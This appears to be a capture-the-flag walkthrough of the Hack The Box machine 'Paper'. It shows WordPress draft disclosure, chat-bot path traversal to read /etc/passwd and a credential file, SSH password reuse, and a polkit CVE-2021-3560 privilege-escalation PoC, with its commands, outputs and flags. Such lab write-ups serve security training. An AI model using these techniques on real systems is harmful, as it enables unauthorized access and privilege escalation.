# Paper

*Linux* - Paper is an easy Linux machine that features an Apache server on ports 80 and 443, which are serving the HTTP and HTTPS versions of a website respectively. The website on port 80 returns a default server webpage but the HTTP response header reveals a hidden domain. This hidden domain is running a WordPress blog, whose version is vulnerable to [CVE-2019-17671](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2). This vulnerability allows us to view the confidential information stored in the draft posts of the blog, which reveal another URL leading to an employee chat system. This chat system is based on Rocketchat. Reading through the chats we find that there is a bot running which can be queried for specific information. We can exploit the bot functionality to obtain the password of a user on the system. Further host enumeration reveals that the sudo version is vulnerable to [CVE-2021-3560](https://www.exploit-db.com/exploits/50011) and can be exploited to elevate to root privileges.

---------
## Task 1
How many TCP ports are open on the remote host?

```sh
nmap -sV -sC 10.10.11.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 01:13 CET
Nmap scan report for 10.10.11.143
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.97 seconds
```

So here we have three open ports: 22, 80, 443.

---------

## Task 2

What is the domain for the Wordpress blog?

```sh
curl -I 10.10.11.143

HTTP/1.1 403 Forbidden
Date: Wed, 26 Mar 2025 00:16:35 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```

With the `cURL` command and the `-I` parameter to get the headers, we see that the `X-Backend-Server` is `office.paper`.

-----------

## Task 3

Which 2019 CVE is the wordpress version vulnerable to?

Since we saw that the backend server is `office.paper` we add this and the ip address to the `/etc/passwd`.

```sh
echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts > /dev/null
```

Now, we can open the web-page `http://office.paper` which is a wordpress page.

Now, let's use `wpscan` to analyze it.

```sh
wpscan --url http://office.paper
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Wed Mar 26 01:32:19 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Rss Generator (Passive Detection)
 |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
 |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>

[+] WordPress theme in use: construction-techup
 | Location: http://office.paper/wp-content/themes/construction-techup/
 | Last Updated: 2022-09-22T00:00:00.000Z
 | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
 | Style Name: Construction Techup
 | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
 | Author: wptexture
 | Author URI: https://testerwp.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Mar 26 01:32:25 2025
[+] Requests Done: 169
[+] Cached Requests: 5
[+] Data Sent: 41.636 KB
[+] Data Received: 167.972 KB
[+] Memory used: 263.613 MB
[+] Elapsed time: 00:00:06

```

Here we see the version of WordPress which is quite outdated `WordPress version 5.2.3 identified (Insecure, released on 2019-09-04)`.

After some search on internet we see that the CVE is `CVE-2019-17671`.

----------

## Task 4

What is the secret registration URL of the employee chat system?

The vulnerability of this version of WordPress allows an unauthenticated user to view private or draft posts due to an issue withing the WP_Query.

This is done by appending `?static=1&order=asc` to the web-page url.

After visiting `http://office.paper/?static=1` we see some private discussions:

```sh
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,  
WRITTEN AND DIRECTED BY  
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

And inside there is the secret registration URL of new emplyee chat system: `http://chat.office.paper/register/8qozr226AhkCHZdyY`.

-----------

## Task 5

What is the name of the bot running on the Rocket Chat instance?

Now let's register to this secret url.

First we should add also the subdomain `chat.office.paper` to `/etc/hsots` file.

```sh
echo "10.10.11.143 chat.office.paper" | sudo tee -a "/etc/hosts" 2>/dev/null
```

After registering we see a `general` chat, which is read-only, however while reading the chats, we see that the user `DwightKSchrute` added a bot called `recyclops`.

```sh
Receptionitis15 Just call the bot by his name and say help. His name is recyclops.  
For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him.  
Now stop wasting my time PAM! I've got work to do!
```

---------------

## Task 6

Which recyclops commands allows listing files?

Let's create a new channel, and add `recyclops` as a member.

Then write `recyclops help`, which shows the available commands.

```sh
4. List:

- You can ask me to list the files
    
- eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
```

So, `list` is the command here.

---------------

## Task 7

What is the file name of the file that contains the configuration information of hubot running on the chat system?

```sh
recyclops list

drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .  
drwx------ 11 dwight dwight 281 Feb 6 2022 ..  
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale  
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
```

Let's go one directory behind.

```sh
recyclops list ..

Fetching the directory listing of ..

- total 32  
    drwx------ 11 dwight dwight 281 Feb 6 2022 .  
    drwxr-xr-x. 3 root root 20 Jan 14 2022 ..  
    lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null  
    -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout  
    -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile  
    -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc  
    -rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_[restart.sh](http://restart.sh)  
    drwx------ 5 dwight dwight 56 Jul 3 2021 .config  
    -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth  
    drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg  
    drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot  
    -rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history  
    drwx------ 3 dwight dwight 19 Jul 3 2021 .local  
    drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla  
    drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm  
    drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales  
    drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh  
    -r-------- 1 dwight dwight 33 Mar 25 20:10 user.txt  
    drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```

We see here a directory called `hubot`, let's check that.

```sh
recyclops list ../hubot

Fetching the directory listing of ../hubot

- total 308  
    drwx------ 8 dwight dwight 4096 Sep 16 2021 .  
    drwx------ 11 dwight dwight 281 Feb 6 2022 ..  
    -rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \  
    srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000  
    srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080  
    drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin  
    -rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env  
    -rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json  
    drwx------ 8 dwight dwight 163 Jul 3 2021 .git  
    -rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore  
    -rw-r--r-- 1 dwight dwight 122549 Mar 25 21:01 .hubot.log  
    -rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE  
    drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules  
    drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak  
    -rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json  
    -rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak  
    -rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json  
    -rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile  
    -rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 [README.md](http://README.md)  
    drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts  
    -rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_[bot.sh](http://bot.sh)  
    drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode  
    -rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
```

From google search we see that the configuration is done on a file called `.env` which we can also see on the directory.

--------------

## Task 6

What is the password obtained from that configuration information?

Let's open the `.env` file.

```sh
recyclops file ../hubot/.env

- <!=====Contents of file ../hubot/.env=====>
    
- export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
    export ROCKETCHAT_USER=recyclops  
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
    export ROCKETCHAT_USESSL=false  
    export RESPOND_TO_DM=true  
    export RESPOND_TO_EDITED=true  
    export PORT=8000  
    export BIND_ADDRESS=127.0.0.1
    
- <!=====End of file ../hubot/.env=====>
```

Here we see the password `Queenofblad3s!23`.

--------------

## Task 7

Which regular user with a home directory exists on Paper other than `rocketchat`?

Let's read the `/etc/passwd` file.

```sh
recyclops file ../../../../../../etc/passwd

- <!=====Contents of file ../../../../../../etc/passwd=====>
    
- root❌0:0:root:/root:/bin/bash  
    bin❌1:1:bin:/bin:/sbin/nologin  
    daemon❌2:2:daemon:/sbin:/sbin/nologin  
    adm❌3:4:adm:/var/adm:/sbin/nologin  
    lp❌4:7:lp:/var/spool/lpd:/sbin/nologin  
    sync❌5:0:sync:/sbin:/bin/sync  
    shutdown❌6:0:shutdown:/sbin:/sbin/shutdown  
    halt❌7:0:halt:/sbin:/sbin/halt  
    mail❌8:12:mail:/var/spool/mail:/sbin/nologin  
    operator❌11:0:operator:/root:/sbin/nologin  
    games❌12💯games:/usr/games:/sbin/nologin  
    ftp❌14:50:FTP User:/var/ftp:/sbin/nologin  
    nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin  
    dbus❌81:81:System message bus:/:/sbin/nologin  
    systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin  
    systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin  
    tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin  
    polkitd❌998:996:User for polkitd:/:/sbin/nologin  
    geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin  
    rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin  
    qemu❌107:107:qemu user:/:/sbin/nologin  
    apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin  
    cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin  
    pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin  
    usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin  
    unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin  
    rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin  
    gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin  
    chrony❌993:987::/var/lib/chrony:/sbin/nologin  
    libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin  
    saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin  
    dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin  
    radvd❌75:75:radvd user:/:/sbin/nologin  
    clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin  
    pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin  
    sssd❌983:981:User for sssd:/:/sbin/nologin  
    colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin  
    rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin  
    setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin  
    pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin  
    gdm❌42:42::/var/lib/gdm:/sbin/nologin  
    gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin  
    insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin  
    sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin  
    avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin  
    tcpdump❌72:72::/:/sbin/nologin  
    mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin  
    nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin  
    mongod❌976:974:mongod:/var/lib/mongo:/bin/false  
    rocketchat❌1001:1001::/home/rocketchat:/bin/bash  
    dwight❌1004:1004::/home/dwight:/bin/bash
    
- <!=====End of file ../../../../../../etc/passwd=====>
```

From this file we see the user `dwight`.

-----------

## Task 10

Submit the flag located in the dwight user's home directory.

Let's first list the files on the `dwight` home directory.

```sh
recyclops list ../../../../../../home/dwight

Fetching the directory listing of ../../../../../home/dwight

- total 32  
    drwx------ 11 dwight dwight 281 Feb 6 2022 .  
    drwxr-xr-x. 3 root root 20 Jan 14 2022 ..  
    lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null  
    -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout  
    -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile  
    -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc  
    -rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_[restart.sh](http://restart.sh)  
    drwx------ 5 dwight dwight 56 Jul 3 2021 .config  
    -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth  
    drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg  
    drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot  
    -rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history  
    drwx------ 3 dwight dwight 19 Jul 3 2021 .local  
    drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla  
    drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm  
    drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales  
    drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh  
    -r-------- 1 dwight dwight 33 Mar 25 20:10 user.txt  
    drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```

We see a file `user.txt`, and now let's read it.

```sh
recyclops file ../../../../../../home/dwight/user.txt

Access denied.
```

From the `nmap` scan we saw also an `ssh` port open, let's try to login there with the user `dwight`and the password obtained before `Queenofblad3s!23`, as there is a possibility of the password reuse.

```sh
ssh dwight@10.10.14.143

The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
dwight@10.10.11.143's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
```

Now, we are in, and let's read the file `user.txt`.

```sh
cat user.txt
a8eb99f7762420b1c202d7f8753fd441
```

----------

## Task 11

What is the polkit version on the remote host?

`polkit` is an authorization service that is used to allow unprivileged processes to communicate with privileged processes.

```sh
rpm -qa polkit

polkit-0.115-6.el8.x86_64
```

So the version is `0.115-6`.

--------------

## Task 12

What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?

After some search on Google we see the vulnerability `CVE-2021-3560`.

-----------

## Task 13

Submit the flag located in root's home directory.

The steps to exploit this vulnerability:
- We have to login via SSH.
- Trigger `polkit` by sending a `dbus` message, but closing the request abruptly, while the request is being processed. Then send a second request with the previous request's unique bus identifier, to execute the request as `root`.

The vulnerability exists as `polkit` treats the UID of a connection with a bus identifier that no longer exists, as requests from the `root`. So, if we can time the attack correctly and terminate the first request at the right moment, we an request the second one with the privileges of the `root`.

I will use the PoC from `secnigma` at https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.

Copy the script to the target machine, and add the execute privileges.

```sh
chmod +x PoC.sh
```

We can add here also a username and a password of a user that we want to create.

```sh
./PoC.sh -u=WhitePlis -p=WPSecurity


[!] Username set as : WhitePlis
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username WhitePlis...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username WhitePlis  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - WhitePlis
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
```

You may need to do this a couple of times, as this is a time-based attack, so sometimes it may not work.

Now let's login with our user.

```sh
[dwight@paper ~]$ su - WhitePlis
Password: 
[WhitePlis@paper ~]$ 
```

Open bash `sudo bash`.

And we are in, with full privileges.

```sh
[root@paper dwight]# ls /root/
anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
```

```sh
[root@paper dwight]# cat /root/root.txt
24ce050639958ece9e6cb6aff3abf474
```

